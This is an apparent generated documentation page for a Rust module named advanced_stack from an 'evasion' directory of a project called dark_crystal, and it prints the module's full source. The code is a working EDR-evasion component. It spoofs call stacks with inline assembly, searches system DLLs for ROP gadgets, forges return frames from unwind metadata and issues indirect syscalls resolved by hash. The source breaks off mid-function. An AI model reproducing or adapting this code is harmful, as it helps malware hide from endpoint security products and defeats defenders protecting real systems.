# advanced_stack

| Field | Value |
|-------|-------|
| **Source** | `src/dark_crystal/crates/core/src/experimental/evasion/advanced_stack.rs` |
| **Lines** | 1162 |
| **Cards** | T009-edr-evasion |
| **Role** | Advanced call stack spoofing |
| **Inline ASM** | Yes |
| **Unsafe blocks** | 22 |

## Constants

- `IMAGE_DIRECTORY_ENTRY_EXCEPTION`: `usize` = `3`

## Types

### struct `NewStackInfo` (line 32)

### struct `Configuration` (line 42)

## Public API

### `get_current_rsp` (line 345)
```rust
pub fn get_current_rsp() -> usize;
```

### `get_current_function_address` (line 346)
```rust
pub fn get_current_function_address() -> usize;
```

### `start_replacement` (line 347)
```rust
pub fn start_replacement(structure: PVOID);
```

### `end_replacement` (line 348)
```rust
pub fn end_replacement(structure: PVOID);
```

### `init` (line 351)
```rust
pub fn init(base_address: usize) -> bool
```

### `start_spoofing` (line 376)
```rust
pub fn start_spoofing() -> bool
```
Prepara y llama al stub asm `start_replacement` para crear un stack limpio.

### `end_spoofing` (line 392)
```rust
pub fn end_spoofing()
```
Finaliza el stack limpio creado por `start_spoofing`.

### `start_stack_replacement` (line 429)
```rust
pub fn start_stack_replacement(base_address: usize) -> bool
```

### `replace_and_syscall` `unsafe` (line 498)
```rust
pub unsafe fn replace_and_syscall(hash: u32, args: &[usize]) -> i32
```

### `replace_and_call` `unsafe` (line 519)
```rust
pub unsafe fn replace_and_call(
```

## Internal Functions

- `spoof_call` (line 343)
- `spoof_call2` (line 344)
- `get_info_structure` (line 403)
- `get_current_runtime_table` (line 445)
- `get_pe_baseaddress` (line 458)
- `get_runtime_table` (line 622)
- `find_gadget` (line 642)
- `get_frame_size_from_address` (line 693)
- `get_rbp_offset_from_address` (line 715)
- `get_frame_of_size` (line 740)
- `generate_random_offset` (line 776)
- `get_frame_size_normal` (line 798)
- `get_rbp_push_offset` (line 889)
- `get_frame_size_from_address_any_module` (line 1000)
- `get_function_size` (line 1038)
- `get_cookie_value` (line 1067)
- `find_cookie_value` (line 1089)
- `module_base_from_address` (line 1150)

## Key Dependencies

- `use bitreader::BitReader;`
- `use dinvoke_rs::data::{RuntimeFunction, ADD_RSP, JMP_RBX, PVOID, TLS_OUT_OF_INDEXES};`
- `use dinvoke_rs::dinvoke::{`
- `use nanorand::{Rng, WyRand};`
- `use windows::core::PCSTR;`
- `use windows::Win32::Foundation::{HANDLE, HMODULE};`
- `use windows::Win32::System::LibraryLoader::{`
- `use windows::Win32::System::Memory::{`
- `use windows::Win32::System::SystemInformation::SYSTEM_INFO;`
- `use windows::Win32::System::Threading::GetCurrentThread;`

## Full Source

```rust
use bitreader::BitReader;
use dinvoke_rs::data::{RuntimeFunction, ADD_RSP, JMP_RBX, PVOID, TLS_OUT_OF_INDEXES};
use dinvoke_rs::dinvoke::{
    get_function_address, get_module_base_address, get_module_handle_ex_a, get_system_info,
    local_alloc, nt_query_information_thread, tls_alloc, tls_get_value, tls_set_value,
    virtual_query_ex,
};
use nanorand::{Rng, WyRand};
#[cfg(target_arch = "x86_64")]
use std::arch::global_asm;
use std::ffi::c_void;
use std::mem::{size_of, transmute};
use std::ptr;
use std::sync::Once;
use windows::core::PCSTR;
use windows::Win32::Foundation::{HANDLE, HMODULE};
use windows::Win32::System::LibraryLoader::{
    GetModuleHandleExA, GET_MODULE_HANDLE_EX_FLAG_FROM_ADDRESS,
    GET_MODULE_HANDLE_EX_FLAG_UNCHANGED_REFCOUNT,
};
use windows::Win32::System::Memory::{
    MEMORY_BASIC_INFORMATION, PAGE_EXECUTE_READ, PAGE_EXECUTE_READWRITE, PAGE_READONLY,
    PAGE_READWRITE,
};
use windows::Win32::System::SystemInformation::SYSTEM_INFO;
use windows::Win32::System::Threading::GetCurrentThread;

const IMAGE_DIRECTORY_ENTRY_EXCEPTION: usize = 3;

#[repr(C)]
#[derive(Clone, Copy, Default)]
pub struct NewStackInfo {
    pub rtladdr: usize,
    pub rtlsize: usize,
    pub baseaddr: usize,
    pub basesize: usize,
    pub current_size: usize,
    pub total_size: usize,
}

#[repr(C)]
struct Configuration {
    god_gadget: usize,
    rtl_unwind_address: usize,
    rtl_unwind_target: usize,
    stub: usize,
    first_frame_function_pointer: PVOID,
    second_frame_function_pointer: PVOID,
    jmp_rbx_gadget: PVOID,
    add_rsp_xgadget: PVOID,
    first_frame_size: usize,
    second_frame_size: usize,
    jmp_rbx_gadget_frame_size: usize,
    add_rsp_xgadget_frame_size: usize,
    stack_offset_where_rbp_is_pushed: usize,
    spoof_function_pointer: PVOID,
    return_address: PVOID,
    nargs: usize,
    arg01: PVOID,
    arg02: PVOID,
    arg03: PVOID,
    arg04: PVOID,
    arg05: PVOID,
    arg06: PVOID,
    arg07: PVOID,
    arg08: PVOID,
    arg09: PVOID,
    arg10: PVOID,
    arg11: PVOID,
    syscall: u32,
    syscall_id: u32,
}

static mut TLS_INDEX: u32 = TLS_OUT_OF_INDEXES;
static mut RUNTIME_INFO: (usize, u32) = (0, 0);
static mut BASE_ADDRESS: usize = 0;
static INIT: Once = Once::new();

// Stubs de stack spoofing (SilentMoonWalk) embebidos directamente.
// Esto reemplaza el gateway.asm externo y elimina la dependencia de MASM/ml64.
#[cfg(target_arch = "x86_64")]
global_asm!(
    r#"
.global get_current_rsp
.global get_current_function_address
.global start_replacement
.global end_replacement
.global spoof_call
.global spoof_call2

.section .text

get_current_rsp:
    mov rax, rsp
    add rax, 8
    ret

get_current_function_address:
    mov rax, [rsp]
    ret

start_replacement:
    mov rax, [rsp]
    mov r11, rsp

    add r11, 8
    push rsp
    push rbp
    push r12
    push r15

    sub rsp, [rcx]
    push qword ptr [rcx + 8]
    sub rsp, [rcx + 24]
    push qword ptr [rcx + 16]
    sub rsp, [rcx + 32]

    mov r15, rbp
    sub r15, r11
    mov r12, rsp
    add r15, r12
    mov rbp, r15

prepare_loop:
    mov r9, 0
start_loop_1:
    mov r8, r11
    mov r12, rsp
    add r8, r9
    add r12, r9
    mov r10, [r8]
    mov [r12], r10
    add r9, 8
    cmp r9, [rcx + 32]
    je end_loop_1
    jmp start_loop_1

end_loop_1:
    jmp rax

end_replacement:
    pop r14
    mov r11, rsp
    mov r8, [rcx + 40]
    add rsp, r8
    pop r15
    pop r12
    pop rbp
    pop rsp
    pop r9

    mov r9, 0
start_loop_2:
    mov r8, r11
    mov rdx, rsp
    add r8, r9
    add rdx, r9
    mov r10, [r8]
    mov [rdx], r10
    add r9, 8
    cmp r9, [rcx + 32]
    je end_loop_2
    jmp start_loop_2

end_loop_2:
    jmp r14

spoof_call2:
    mov rax, [rsp]
    mov r10, [rcx + 112]
    mov [rsp], r10
    mov [rsp + 8], rbp
    mov [rsp + 16], rbx
    mov [rsp + 24], rax
    mov rbp, rsp

    lea rax, [rip + restore2]
    push rax

    lea rbx, [rsp]
    add rsp, 8

    sub rsp, [rcx + 80]
    push qword ptr [rcx + 48]
    sub rsp, [rcx + 88]
    push qword ptr [rcx + 56]

    mov r11, [rcx + 104]
    jmp parameter_handler

spoof_call:
    mov [rsp + 8], rbp
    mov [rsp + 16], rbx
    mov rbp, rsp

    lea rax, [rip + restore]
    push rax

    lea rbx, [rsp]

    push qword ptr [rcx + 32]

    mov rax, [rcx + 112]
    sub rax, [rcx + 64]

    sub rsp, [rcx + 72]
    mov r10, [rcx + 96]
    mov [rsp + r10], rax

    push qword ptr [rcx + 40]

    sub rsp, [rcx + 80]
    push qword ptr [rcx + 48]
    sub rsp, [rcx + 88]
    push qword ptr [rcx + 56]

    mov r11, [rcx + 104]
    jmp parameter_handler

restore:
    mov rsp, rbp
    mov rbp, [rsp + 8]
    mov rbx, [rsp + 16]
    ret

restore2:
    mov rsp, rbp
    mov rbp, [rsp + 24]
    mov [rsp], rbp
    mov rbp, [rsp + 8]
    mov rbx, [rsp + 16]
    ret

parameter_handler:
    cmp qword ptr [rcx + 120], 11
    je handle_eleven
    cmp qword ptr [rcx + 120], 10
    je handle_ten
    cmp qword ptr [rcx + 120], 9
    je handle_nine
    cmp qword ptr [rcx + 120], 8
    je handle_eight
    cmp qword ptr [rcx + 120], 7
    je handle_seven
    cmp qword ptr [rcx + 120], 6
    je handle_six
    cmp qword ptr [rcx + 120], 5
    je handle_five
    cmp qword ptr [rcx + 120], 4
    je handle_four
    cmp qword ptr [rcx + 120], 3
    je handle_three
    cmp qword ptr [rcx + 120], 2
    je handle_two
    cmp qword ptr [rcx + 120], 1
    je handle_one
    cmp qword ptr [rcx + 120], 0
    je handle_none

handle_eleven:
    push r15
    mov r15, [rcx + 208]
    mov [rsp + 96], r15
    pop r15
    jmp handle_ten

handle_ten:
    push r15
    mov r15, [rcx + 200]
    mov [rsp + 88], r15
    pop r15
    jmp handle_nine

handle_nine:
    push r15
    mov r15, [rcx + 192]
    mov [rsp + 80], r15
    pop r15
    jmp handle_eight

handle_eight:
    push r15
    mov r15, [rcx + 184]
    mov [rsp + 72], r15
    pop r15
    jmp handle_seven

handle_seven:
    push r15
    mov r15, [rcx + 176]
    mov [rsp + 64], r15
    pop r15
    jmp handle_six

handle_six:
    push r15
    mov r15, [rcx + 168]
    mov [rsp + 56], r15
    pop r15
    jmp handle_five

handle_five:
    push r15
    mov r15, [rcx + 160]
    mov [rsp + 48], r15
    pop r15
    jmp handle_four

handle_four:
    mov r9, [rcx + 152]
    jmp handle_three

handle_three:
    mov r8, [rcx + 144]
    jmp handle_two

handle_two:
    mov rdx, [rcx + 136]
    jmp handle_one

handle_one:
    cmp dword ptr [rcx + 216], 0
    jne execute_syscall
    mov rcx, [rcx + 128]
    jmp handle_none

handle_none:
    jmp execute

execute:
    jmp r11

execute_syscall:
    mov r10, [rcx + 128]
    mov eax, [rcx + 220]
    mov rcx, [rcx + 128]
    jmp r11
"#
);

#[cfg(target_arch = "x86_64")]
extern "C" {
    fn spoof_call(structure: PVOID) -> PVOID;
    fn spoof_call2(structure: PVOID) -> PVOID;
    pub fn get_current_rsp() -> usize;
    pub fn get_current_function_address() -> usize;
    pub fn start_replacement(structure: PVOID);
    pub fn end_replacement(structure: PVOID);
}

pub fn init(base_address: usize) -> bool {
    unsafe {
        let mut ok = true;
        INIT.call_once(|| {
            let mut resolved_base = base_address;
            if resolved_base == 0 {
                let current = get_current_function_address();
                resolved_base = module_base_from_address(current);
                if resolved_base == 0 {
                    resolved_base = get_module_base_address("ntdll.dll");
                }
            }
            let runtime_info = get_runtime_table(resolved_base);
            if runtime_info.1 == 0 {
                ok = false;
                return;
            }
            RUNTIME_INFO = (runtime_info.0 as usize, runtime_info.1);
            BASE_ADDRESS = resolved_base;
        });
        ok
    }
}

/// Prepara y llama al stub asm `start_replacement` para crear un stack limpio.
pub fn start_spoofing() -> bool {
    unsafe {
        if !start_stack_replacement(BASE_ADDRESS) {
            return false;
        }
        let current_size = get_frame_size_from_address(get_current_function_address());
        if current_size == 0 {
            return false;
        }
        let info = get_info_structure(current_size as usize);
        start_replacement(transmute(&info));
        true
    }
}

/// Finaliza el stack limpio creado por `start_spoofing`.
pub fn end_spoofing() {
    unsafe {
        let current_size = get_frame_size_from_address(get_current_function_address());
        if current_size == 0 {
            return;
        }
        let info = get_info_structure(current_size as usize);
        end_replacement(transmute(&info));
    }
}

fn get_info_structure(current_size: usize) -> NewStackInfo {
    unsafe {
        let ntdll = get_module_base_address("ntdll.dll");
        let kernel32 = get_module_base_address("kernel32.dll");

        let rtl_user_thread_start = get_function_address(ntdll, "RtlUserThreadStart");
        let size_rtl: i32 =
            get_frame_size_from_address_any_module(ntdll as _, rtl_user_thread_start as _);
        let rtl_user_thread_start_address = rtl_user_thread_start as usize + 0x21usize;

        let base_thread_init_thunk = get_function_address(kernel32, "BaseThreadInitThunk");
        let size_base =
            get_frame_size_from_address_any_module(kernel32 as _, base_thread_init_thunk as _);
        let base_thread_init_thunk_address = base_thread_init_thunk as usize + 0x14usize;

        let mut stack_info: NewStackInfo = std::mem::zeroed();
        stack_info.rtladdr = rtl_user_thread_start_address;
        stack_info.rtlsize = size_rtl as usize;
        stack_info.baseaddr = base_thread_init_thunk_address;
        stack_info.basesize = size_base as usize;
        stack_info.current_size = current_size;
        stack_info.total_size = size_rtl as usize + size_base as usize + current_size + 16;
        stack_info
    }
}

pub fn start_stack_replacement(base_address: usize) -> bool {
    unsafe {
        if BASE_ADDRESS != 0 && RUNTIME_INFO != (0, 0) {
            return true;
        }

        let runtime_info = get_current_runtime_table(base_address);
        if runtime_info.1 == 0 {
            return false;
        }

        RUNTIME_INFO = (runtime_info.0 as _, runtime_info.1);
        true
    }
}

fn get_current_runtime_table(mut base_address: usize) -> (*mut RuntimeFunction, u32) {
    unsafe {
        if base_address == 0 {
            base_address = get_pe_baseaddress();
            if base_address == 0 {
                return (ptr::null_mut(), 0);
            }
        }
        BASE_ADDRESS = base_address;
        get_runtime_table(BASE_ADDRESS)
    }
}

fn get_pe_baseaddress() -> usize {
    unsafe {
        let mut si = SYSTEM_INFO::default();
        get_system_info(&mut si);

        let main_address = get_pe_baseaddress as usize;
        let mut mem: usize = 0;
        let max = si.lpMaximumApplicationAddress as usize;
        let mut previous_region = MEMORY_BASIC_INFORMATION::default();
        while mem < max {
            let mut buffer = MEMORY_BASIC_INFORMATION::default();
            let length = size_of::<MEMORY_BASIC_INFORMATION>();
            let _r = virtual_query_ex(
                HANDLE((-1isize) as *mut c_void),
                mem as *const c_void,
                &mut buffer as *mut _,
                length,
            );

            let prot = buffer.Protect.0;
            let is_readable = prot == PAGE_READONLY.0
                || prot == PAGE_READWRITE.0
                || prot == PAGE_EXECUTE_READ.0
                || prot == PAGE_EXECUTE_READWRITE.0;

            if is_readable {
                if main_address >= buffer.BaseAddress as usize
                    && main_address <= buffer.BaseAddress as usize + buffer.RegionSize
                {
                    return previous_region.BaseAddress as usize;
                }
                previous_region = buffer;
            }

            mem = buffer.BaseAddress as usize + buffer.RegionSize;
        }
        0
    }
}

pub unsafe fn replace_and_syscall(hash: u32, args: &[usize]) -> i32 {
    if !start_spoofing() {
        return -1;
    }
    let map = crate::sysindirect_map::syscall_map();
    let &(ssn, gadget) = match map.get(&hash) {
        Some(v) => v,
        None => return -1,
    };

    let mut arg_vec: Vec<*mut c_void> = Vec::new();
    arg_vec.push(gadget as *mut c_void);
    for &arg in args {
        arg_vec.push(arg as *mut c_void);
    }

    let res = replace_and_call(arg_vec, true, ssn);
    end_spoofing();
    res as i32
}

pub unsafe fn replace_and_call(
    mut args: Vec<*mut c_void>,
    is_syscall: bool,
    id: u32,
) -> *mut c_void {
    let mut config: Configuration = std::mem::zeroed();
    let mut black_list: Vec<(u32, u32)> = vec![];

    let kernelbase = get_module_base_address("kernelbase.dll");
    if kernelbase == 0 {
        return ptr::null_mut();
    }

    let mut first_gadget_size = 0i32;
    let first_gadget_addr = find_gadget(kernelbase, &mut first_gadget_size, 0, &mut black_list);

    let mut second_gadget_size = 0i32;
    let second_gadget_addr = find_gadget(kernelbase, &mut second_gadget_size, 1, &mut black_list);
    if first_gadget_addr == 0 || second_gadget_addr == 0 {
        return ptr::null_mut();
    }

    config.jmp_rbx_gadget = first_gadget_addr as *mut _;
    config.jmp_rbx_gadget_frame_size = first_gadget_size as usize;
    config.add_rsp_xgadget = second_gadget_addr as *mut _;
    config.add_rsp_xgadget_frame_size = second_gadget_size as usize;
    config.spoof_function_pointer = args.remove(0);
    config.syscall = is_syscall as u32;
    config.syscall_id = id;

    // Datos de los dos frames que construirá gateway.asm
    config.first_frame_function_pointer = get_current_function_address() as _;
    let args_number = args.len();
    config.nargs = args_number;

    for (i, &arg) in args.iter().enumerate() {
        match i {
            0 => config.arg01 = arg,
            1 => config.arg02 = arg,
            2 => config.arg03 = arg,
            3 => config.arg04 = arg,
            4 => config.arg05 = arg,
            5 => config.arg06 = arg,
            6 => config.arg07 = arg,
            7 => config.arg08 = arg,
            8 => config.arg09 = arg,
            9 => config.arg10 = arg,
            10 => config.arg11 = arg,
            _ => break,
        }
    }

    let current_function_address = get_current_function_address();
    let current_function_size = get_frame_size_from_address(current_function_address);
    if current_function_size == 0 {
        return ptr::null_mut();
    }
    config.first_frame_size = current_function_size as usize;

    let current_function_replacement =
        get_frame_of_size(current_function_size as i32, Vec::default(), false) as *mut usize;
    config.return_address = current_function_replacement as _;

    let current_rsp = get_current_rsp() as *mut usize;
    let n = current_function_size / 8;
    let cookie = find_cookie_value(current_function_size as usize);
    let return_address_ptr = if cookie != 0 {
        cookie as *mut usize
    } else {
        current_rsp.add(n as _)
    };
    let return_address: usize = *return_address_ptr;

    let replaced_function_size = get_frame_size_from_address(return_address);
    if replaced_function_size == 0 {
        return ptr::null_mut();
    }
    let replacement_frame = get_frame_of_size(replaced_function_size as i32, Vec::default(), false);
    if replacement_frame == 0 {
        return ptr::null_mut();
    }

    *return_address_ptr = replacement_frame;
    config.second_frame_function_pointer = return_address as _;
    config.second_frame_size = replaced_function_size as usize;

    // Estimar offset donde RBP se empuja en el segundo frame; si no se conoce, usar extremo inferior.
    config.stack_offset_where_rbp_is_pushed = get_rbp_offset_from_address(return_address)
        .unwrap_or_else(|| {
            if replaced_function_size >= 8 {
                (replaced_function_size - 8) as usize
            } else {
                0
            }
        });

    let config_ptr: PVOID = transmute(&config);
    let r = spoof_call(config_ptr);

    *return_address_ptr = return_address;
    r
}

fn get_runtime_table(module: usize) -> (*mut RuntimeFunction, u32) {
    unsafe {
        if module == 0 {
            return (ptr::null_mut(), 0);
        }
        let pe_info = match dinvoke_rs::manualmap::get_pe_metadata(module as *const u8, false) {
            Ok(info) => info,
            Err(_) => return (ptr::null_mut(), 0),
        };
        let exception_dir = pe_info.opt_header_64.datas_directory[IMAGE_DIRECTORY_ENTRY_EXCEPTION];
        if exception_dir.VirtualAddress == 0 {
            return (ptr::null_mut(), 0);
        }
        (
            (module + exception_dir.VirtualAddress as usize) as *mut RuntimeFunction,
            exception_dir.Size,
        )
    }
}

fn find_gadget(
    module: usize,
    gadget_frame_size: &mut i32,
    arg: i32,
    black_list: &mut Vec<(u32, u32)>,
) -> usize {
    unsafe {
        let exception_directory = get_runtime_table(module);
        let mut rt = exception_directory.0;
        if rt == ptr::null_mut() {
            return 0;
        }

        let items = exception_directory.1 / 12;
        let mut rng = WyRand::new();
        let rt_offset = rng.generate_range(0..(items / 2));
        rt = rt.add(rt_offset as usize);
        let mut count = rt_offset;

        while count < items {
            let mut function_start_address = (module + (*rt).begin_addr as usize) as *mut u8;
            let function_end_address = (module + (*rt).end_addr as usize) as *mut u8;
            let item = ((*rt).begin_addr, (*rt).end_addr);

            if black_list.contains(&item) {
                rt = rt.add(1);
                count += 1;
                continue;
            }

            while (function_start_address as usize) < (function_end_address as usize) - 3 {
                if (*(function_start_address as *mut u16) == JMP_RBX && arg == 0)
                    || (*(function_start_address as *mut u32) == ADD_RSP
                        && *(function_start_address.add(4)) == 0xc3
                        && arg == 1)
                {
                    *gadget_frame_size = get_frame_size_normal(module, *rt, false, &mut false);
                    if *gadget_frame_size != 0 {
                        black_list.push(item);
                        return function_start_address as usize;
                    }
                }
                function_start_address = function_start_address.add(1);
            }
            rt = rt.add(1);
            count += 1;
        }
        0
    }
}

fn get_frame_size_from_address(address: usize) -> i32 {
    unsafe {
        let module = module_base_from_address(address);
        if module == 0 {
            return 0;
        }

        let exception_directory = get_runtime_table(module);
        let mut rt = exception_directory.0;
        let items = exception_directory.1 / 12;
        let rva = (address - module) as u32;

        for _ in 0..items {
            if rva >= (*rt).begin_addr && rva < (*rt).end_addr {
                return get_frame_size_normal(module, *rt, false, &mut false);
            }
            rt = rt.add(1);
        }
        0
    }
}

fn get_rbp_offset_from_address(address: usize) -> Option<usize> {
    unsafe {
        let module = module_base_from_address(address);
        if module == 0 {
            return None;
        }

        let exception_directory = get_runtime_table(module);
        let mut rt = exception_directory.0;
        if rt.is_null() {
            return None;
        }
        let items = exception_directory.1 / 12;
        let rva = (address - module) as u32;

        for _ in 0..items {
            if rva >= (*rt).begin_addr && rva < (*rt).end_addr {
                return get_rbp_push_offset(module, *rt);
            }
            rt = rt.add(1);
        }
        None
    }
}

fn get_frame_of_size(desired_size: i32, mut black_list: Vec<(u32, u32)>, ignore: bool) -> usize {
    unsafe {
        let modules = ["kernel32.dll", "kernelbase.dll", "ntdll.dll"];
        let mut rng = WyRand::new();

        for &mod_name in &modules {
            let module = get_module_base_address(mod_name);
            if module == 0 {
                continue;
            }

            let exception_directory = get_runtime_table(module);
            let mut rt = exception_directory.0;
            if rt == ptr::null_mut() {
                continue;
            }

            let items = exception_directory.1 / 12;
            let rt_offset = rng.generate_range(0..(items / 2));
            rt = rt.add(rt_offset as usize);

            for _ in 0..(items - rt_offset) {
                let frame_size = get_frame_size_normal(module, *rt, ignore, &mut false);
                if frame_size == desired_size {
                    let random_offset = generate_random_offset(module, *rt);
                    if random_offset != 0 {
                        return module + random_offset as usize;
                    }
                }
                rt = rt.add(1);
            }
        }
        0
    }
}

fn generate_random_offset(module: usize, rt: RuntimeFunction) -> u32 {
    unsafe {
        let mut start = (module + rt.begin_addr as usize) as *mut u8;
        let end = (module + rt.end_addr as usize) as *mut u8;
        let mut offsets = Vec::new();

        while (start as usize) < (end as usize) - 5 {
            // Look for CALL [rip+0] or similar return address patterns
            if *start == 0xe8 || *start == 0xff {
                offsets.push((start as usize - module) as u32 + 5);
            }
            start = start.add(1);
        }

        if offsets.is_empty() {
            return 0;
        }
        let mut rng = WyRand::new();
        offsets[rng.generate_range(0..offsets.len())]
    }
}

fn get_frame_size_normal(
    module: usize,
    runtime_function: RuntimeFunction,
    ignore_rsp_and_bp: bool,
    base_pointer: &mut bool,
) -> i32 {
    unsafe {
        let unwind_info = (module + runtime_function.unwind_addr as usize) as *mut u8;
        let version_and_flags = *unwind_info;
        let flags = (version_and_flags >> 3) & 0x1f;
        let unwind_codes_count = *(unwind_info.add(2));

        let mut unwind_code = unwind_info.add(4);
        let mut frame_size = 0;
        let mut index = 0;

        while index < unwind_codes_count {
            let op_code_info = *unwind_code.add(1);
            let op_info = op_code_info >> 4;
            let op_code = op_code_info & 0x0f;

            match op_code {
                0 => {
                    // UWOP_PUSH_NONVOL
                    if op_info == 4 && !ignore_rsp_and_bp {
                        return 0;
                    }
                    frame_size += 8;
                }
                1 => {
                    // UWOP_ALLOC_LARGE
                    if op_info == 0 {
                        let size = *(unwind_code.add(2) as *mut u16);
                        frame_size += size as i32 * 8;
                        unwind_code = unwind_code.add(2);
                        index += 1;
                    } else {
                        let size = *(unwind_code.add(2) as *mut u32);
                        frame_size += size as i32;
                        unwind_code = unwind_code.add(4);
                        index += 2;
                    }
                }
                2 => {
                    // UWOP_ALLOC_SMALL
                    frame_size += (op_info * 8 + 8) as i32;
                }
                3 => {
                    // UWOP_SET_FPREG
                    *base_pointer = true;
                    if !ignore_rsp_and_bp {
                        return 0;
                    }
                }
                4 | 5 => {
                    // UWOP_SAVE_NONVOL(_FAR)
                    if op_info == 4 && !ignore_rsp_and_bp {
                        return 0;
                    }
                    unwind_code = unwind_code.add(if op_code == 4 { 2 } else { 4 });
                    index += if op_code == 4 { 1 } else { 2 };
                }
                8 | 9 => {
                    // UWOP_SAVE_XMM128(_FAR)
                    unwind_code = unwind_code.add(if op_code == 8 { 2 } else { 4 });
                    index += if op_code == 8 { 1 } else { 2 };
                }
                10 => {
                    // UWOP_PUSH_MACH_FRAME
                    frame_size += if op_info == 0 { 64 } else { 72 };
                }
                _ => {}
            }
            unwind_code = unwind_code.add(2);
            index += 1;
        }

        if (flags & 0x08) != 0 {
            // UNW_FLAG_CHAININFO
            if unwind_codes_count % 2 != 0 {
                unwind_code = unwind_code.add(2);
            }
            let chained_rt = unwind_code as *mut RuntimeFunction;
            frame_size +=
                get_frame_size_normal(module, *chained_rt, ignore_rsp_and_bp, base_pointer);
        }

        frame_size
    }
}

fn get_rbp_push_offset(module: usize, runtime_function: RuntimeFunction) -> Option<usize> {
    unsafe {
        let unwind_info = (module + runtime_function.unwind_addr as usize) as *mut u8;
        let version_and_flags = *unwind_info;
        let flags = (version_and_flags >> 3) & 0x1f;
        let unwind_codes_count = *(unwind_info.add(2));
        let mut unwind_code = unwind_info.add(4);
        let mut frame_size = 0i32;
        let mut found = false;
        let mut push_offset = 0i32;
        let mut index = 0;

        while index < unwind_codes_count {
            let op_code_info = *unwind_code.add(1);
            let op_info = op_code_info >> 4;
            let op_code = op_code_info & 0x0f;

            match op_code {
                0 => {
                    // UWOP_PUSH_NONVOL
                    if op_info == 5 {
                        if found {
                            return None;
                        }
                        push_offset = frame_size;
                        found = true;
                    }
                    frame_size += 8;
                }
                1 => {
                    // UWOP_ALLOC_LARGE
                    if op_info == 0 {
                        let size = *(unwind_code.add(2) as *mut u16);
                        frame_size += size as i32 * 8;
                        unwind_code = unwind_code.add(2);
                        index += 1;
                    } else {
                        let size = *(unwind_code.add(2) as *mut u32);
                        frame_size += size as i32;
                        unwind_code = unwind_code.add(4);
                        index += 2;
                    }
                }
                2 => {
                    frame_size += (op_info * 8 + 8) as i32;
                }
                3 => {
                    return None;
                } // SET_FPREG -> indeterminado
                4 => {
                    // UWOP_SAVE_NONVOL
                    if op_info == 5 {
                        if found {
                            return None;
                        }
                        let offset = *(unwind_code.add(2) as *mut u16) as i32 * 8;
                        push_offset = frame_size + offset;
                        found = true;
                    }
                    unwind_code = unwind_code.add(2);
                    index += 1;
                }
                5 => {
                    // UWOP_SAVE_NONVOL_FAR
                    if op_info == 5 {
                        if found {
                            return None;
                        }
                        let off1 = *(unwind_code.add(2) as *mut u16) as i32;
                        let off2 = *(unwind_code.add(4) as *mut u16) as i32;
                        push_offset = frame_size + off1 + (off2 << 16);
                        found = true;
                    }
                    unwind_code = unwind_code.add(4);
                    index += 2;
                }
                8 => {
                    unwind_code = unwind_code.add(2);
                    index += 1;
                } // XMM
                9 => {
                    unwind_code = unwind_code.add(4);
                    index += 2;
                }
                10 => {
                    frame_size += if op_info == 0 { 64 } else { 72 };
                }
                _ => {}
            }
            unwind_code = unwind_code.add(2);
            index += 1;
        }

        if (flags & 0x08) != 0 {
            if unwind_codes_count % 2 != 0 {
                unwind_code = unwind_code.add(2);
            }
            let chained_rt = unwind_code as *mut RuntimeFunction;
            if let Some(off) = get_rbp_push_offset(module, *chained_rt) {
                return Some((frame_size + off as i32) as usize);
            }
        }

        if found {
            Some(push_offset as usize)
        } else {
            None
        }
    }
}

fn get_frame_size_from_address_any_module(mut module: usize, address: usize) -> i32 {
    unsafe {
        if module == 0 {
            let mut module_handle = 0usize;
            let module_handle_ptr: *mut usize = transmute(&mut module_handle);
            get_module_handle_ex_a(0x00000004 | 0x00000002, address as _, module_handle_ptr);
            if module_handle == 0 {
                return 0;
            } else {
                module = module_handle;
            }
        }

        let exception_directory = get_runtime_table(module);
        let mut rt = exception_directory.0;
        if rt == ptr::null_mut() {
            return 0;
        }

        let items = exception_directory.1 / 12;
        let mut count = 0;
        while count < items {
            let function_start_address = (module + (*rt).begin_addr as usize) as *mut u8;
            let function_end_address = (module + (*rt).end_addr as usize) as *mut u8;
            if address >= function_end_address as usize || address < function_start_address as usize
            {
                rt = rt.add(1);
                count += 1;
                continue;
            } else {
                let size = get_frame_size_normal(module, *rt, true, &mut false);
                return size;
            }
        }
        0
    }
}

fn get_function_size(base_address: usize, function_address: usize) -> (usize, usize) {
    unsafe {
        let exception_directory = get_runtime_table(base_address);
        let mut rt = exception_directory.0;
        if rt == ptr::null_mut() {
            return (0, 0);
        }

        let items = exception_directory.1 / 12;
        let mut count = 0;
        while count < items {
            let function_start_address = (base_address + (*rt).begin_addr as usize) as *mut u8;
            let function_end_address = (base_address + (*rt).end_addr as usize) as *mut u8;
            if function_address >= function_start_address as usize
                && function_address < function_end_address as usize
            {
                return (
                    function_start_address as usize,
                    function_end_address as usize,
                );
            }

            rt = rt.add(1);
            count += 1;
        }
        (0, 0)
    }
}

fn get_cookie_value() -> usize {
    unsafe {
        if TLS_INDEX == TLS_OUT_OF_INDEXES {
            let r = tls_alloc();
            if r == TLS_OUT_OF_INDEXES {
                return 0;
            }
            TLS_INDEX = r;
        }

        let value = tls_get_value(TLS_INDEX) as *mut usize;
        if value as usize == 0 {
            let heap_region = local_alloc(0x0040, 8);
            if !heap_region.is_null() {
                let _ = tls_set_value(TLS_INDEX, heap_region);
            }
            return 0;
        }
        *value
    }
}

fn find_cookie_value(current_function_size: usize) -> usize {
    unsafe {
        let cookie = get_cookie_value();
        if cookie != 0 {
            return cookie;
        }

        let k32 = get_module_base_address("kernel32.dll");
        let base_thread_init_thunk_start =
            get_function_address(k32, "BaseThreadInitThunk") as usize;
        let base_thread_init_thunk_addresses =
            get_function_size(k32 as usize, base_thread_init_thunk_start);
        let base_thread_init_thunk_end = base_thread_init_thunk_addresses.1;

        let thread_handle = GetCurrentThread();
        let mut start_address = 1usize;
        let mut end_address = 0usize;
        // thread info class 9
        let thread_info_class = 9u32;
        let mut thread_information: usize = 0;
        let ret_len: *mut u32 = std::ptr::null_mut();
        let ret = nt_query_information_thread(
            thread_handle,
            thread_info_class,
            transmute(&mut thread_information),
            8,
            ret_len,
        );
        if ret == 0 {
            let function_address = thread_information as *const u8;
            let mut module_handle = 0usize;
            let module_handle_ptr: *mut usize = transmute(&mut module_handle);
            let ok = get_module_handle_ex_a(0x00000004, function_address, module_handle_ptr);
            if ok {
                let function_addresses = get_function_size(module_handle, function_address as _);
                start_address = function_addresses.0;
                end_address = function_addresses.1;
            }
        }

        let mut stack_iterator: *mut usize = get_current_rsp() as *mut usize;
        // Avoid unbounded scanning if the expected return address never appears.
        let mut remaining = (current_function_size / 8).saturating_add(1024);
        while remaining > 0 {
            if (*stack_iterator > start_address && *stack_iterator < end_address)
                || (*stack_iterator > base_thread_init_thunk_start
                    && *stack_iterator < base_thread_init_thunk_end)
            {
